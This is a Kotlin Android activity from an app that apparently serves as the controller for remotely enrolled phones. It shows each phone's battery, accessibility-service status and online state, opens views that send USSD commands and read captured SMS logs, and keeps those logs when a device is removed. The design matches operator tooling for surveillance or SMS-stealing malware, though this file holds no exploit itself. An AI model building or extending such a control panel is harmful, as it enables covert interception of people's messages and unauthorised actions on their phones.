package com.notification.controller

import android.content.Intent
import android.os.Bundle
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.database.FirebaseDatabase

class DeviceDashboardActivity : AppCompatActivity() {

    private lateinit var deviceNameTitle: TextView
    private lateinit var editNameButton: Button
    private lateinit var ussdControlBtn: Button
    private lateinit var smsLogsBtn: Button
    private lateinit var deleteDeviceBtn: Button
    private lateinit var dashboardBattery: TextView
    private lateinit var dashboardAccessibility: TextView
    private lateinit var dashboardStatus: TextView

    private var deviceId: String = ""
    private var fcmToken: String = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_device_dashboard)

        deviceId = intent.getStringExtra("device_id") ?: ""
        fcmToken = intent.getStringExtra("fcm_token") ?: ""

        deviceNameTitle = findViewById(R.id.deviceNameTitle)
        editNameButton = findViewById(R.id.editNameButton)
        ussdControlBtn = findViewById(R.id.ussdControlBtn)
        smsLogsBtn = findViewById(R.id.smsLogsBtn)
        deleteDeviceBtn = findViewById(R.id.deleteDeviceBtn)
        dashboardBattery = findViewById(R.id.dashboardBattery)
        dashboardAccessibility = findViewById(R.id.dashboardAccessibility)
        dashboardStatus = findViewById(R.id.dashboardStatus)

        listenForStatus()

        editNameButton.setOnClickListener {
            showEditNameDialog()
        }

        ussdControlBtn.setOnClickListener {
            val intent = Intent(this, SendUssdActivity::class.java)
            intent.putExtra("device_id", deviceId)
            intent.putExtra("device_name", deviceNameTitle.text.toString())
            intent.putExtra("fcm_token", fcmToken)
            startActivity(intent)
        }

        smsLogsBtn.setOnClickListener {
            val intent = Intent(this, SmsLogsActivity::class.java)
            intent.putExtra("device_id", deviceId)
            startActivity(intent)
        }

        deleteDeviceBtn.setOnClickListener {
            showDeleteConfirmDialog()
        }
    }

    private fun showDeleteConfirmDialog() {
        AlertDialog.Builder(this)
            .setTitle("Delete Device?")
            .setMessage("Are you sure you want to remove this device and all its logs? This cannot be undone.")
            .setPositiveButton("Delete") { _, _ ->
                deleteDevice()
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun deleteDevice() {
        val db = FirebaseDatabase.getInstance().reference
        
        // Remove ONLY the device from the active registry (Main List)
        // We do NOT delete logs, responses, or sms folders to preserve history
        db.child("devices").child(deviceId).removeValue()
        
        Toast.makeText(this, "Device removed from list (History preserved)", Toast.LENGTH_SHORT).show()
        finish() // Go back to main list
    }

    private fun listenForStatus() {
        val ref = FirebaseDatabase.getInstance().reference.child("devices").child(deviceId)
        ref.addValueEventListener(object : com.google.firebase.database.ValueEventListener {
            override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                val data = snapshot.value as? Map<*, *> ?: return
                val model = data["model_name"] as? String ?: "Unknown"
                val custom = data["custom_name"] as? String ?: ""
                val battery = (data["battery_level"] as? Long)?.toInt() ?: -1
                val acc = data["accessibility_active"] as? Boolean ?: false
                val lastSeen = data["last_seen"] as? Long ?: 0L
                
                deviceNameTitle.text = if (custom.isNotEmpty()) custom else model
                dashboardBattery.text = "Battery: ${if (battery != -1) "$battery%" else "--%"}"
                dashboardAccessibility.text = "Accessibility: ${if (acc) "✅ ACTIVE" else "❌ OFF"}"
                
                val isOnline = (System.currentTimeMillis() - lastSeen) < (10 * 60 * 1000)
                dashboardStatus.text = "Status: ${if (isOnline) "🟢 ONLINE" else "⚪ OFFLINE"}"
            }

            override fun onCancelled(error: com.google.firebase.database.DatabaseError) {}
        })
    }

    private fun showEditNameDialog() {
        val input = EditText(this)
        input.setText(deviceNameTitle.text)
        
        AlertDialog.Builder(this)
            .setTitle("Set Device Nickname")
            .setMessage("Give this device a friendly name (e.g. Grandma's Home Phone)")
            .setView(input)
            .setPositiveButton("Save") { _, _ ->
                val newName = input.text.toString().trim()
                if (newName.isNotEmpty()) {
                    FirebaseDatabase.getInstance().reference
                        .child("devices").child(deviceId)
                        .child("custom_name").setValue(newName)
                }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }
}
